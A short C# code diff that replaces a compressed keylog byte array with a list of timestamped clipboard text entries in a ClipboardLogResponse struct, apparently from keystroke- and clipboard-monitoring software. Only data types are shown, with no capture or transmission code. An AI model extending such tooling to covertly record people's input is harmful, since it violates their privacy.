@@ -62,7 +62,13 @@
 		[Serializable]
 		public struct ClipboardLogResponse
 		{
-			public byte[] CompressedKeyLogs { get; set; }
+			public List<ClipboardEntry> Entries { get; set; }
+		}
+
+		public struct ClipboardEntry
+		{
+			public DateTime TimeStamp;
+			public string Text;
 		}
 		#endregion
 
